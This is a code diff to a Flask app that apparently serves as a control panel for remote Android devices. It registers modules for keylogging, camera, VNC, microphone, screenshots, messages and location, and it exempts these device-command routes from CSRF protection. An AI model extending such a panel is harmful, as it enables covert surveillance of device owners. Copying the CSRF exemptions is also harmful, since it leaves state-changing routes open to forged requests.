@@ -9,8 +9,9 @@ from flask import Flask, render_template, session, redirect, url_for, request, j
 from dotenv import load_dotenv
 from flask_wtf.csrf import CSRFProtect, CSRFError
 from datetime import timedelta
-from user.routes import auth, dashboard, devices
-from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger, stream_camera, stream_vnc
+from user.routes import auth, dashboard, devices, profile
+from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger, stream_camera, stream_vnc, screenshot, microphone, command_center, policies
+from user.routes.notifications import notifications_bp
 import os
 from config.database import init_app, db
 from utils.filters import init_filters
@@ -56,6 +57,7 @@ def index():
 app.register_blueprint(auth.auth)
 app.register_blueprint(dashboard.dashboard)
 app.register_blueprint(devices.devices)
+app.register_blueprint(profile.profile)
 
 # Command blueprints
 app.register_blueprint(location.location_command)
@@ -68,7 +70,22 @@ app.register_blueprint(file_manager.file_manager_command)
 app.register_blueprint(keylogger.keylogger_command)
 app.register_blueprint(stream_camera.stream_camera_bp)
 app.register_blueprint(stream_vnc.stream_vnc_bp)
- 
+app.register_blueprint(screenshot.screenshot_command)
+app.register_blueprint(microphone.microphone_command)
+app.register_blueprint(command_center.command_center_command)
+app.register_blueprint(policies.policies_command)
+app.register_blueprint(notifications_bp)
+
+# Exempt command proxy blueprints from CSRF — these POST to Android devices,
+# not user-facing forms, so CSRF tokens aren't available.
+csrf.exempt(keylogger.keylogger_command)
+csrf.exempt(microphone.microphone_command)
+csrf.exempt(screenshot.screenshot_command)
+csrf.exempt(stream_camera.stream_camera_bp)
+csrf.exempt(stream_vnc.stream_vnc_bp)
+csrf.exempt(command_center.command_center_command)
+csrf.exempt(file_manager.file_manager_command)
+
 if __name__ == '__main__':
     with app.app_context():
         db.create_all()
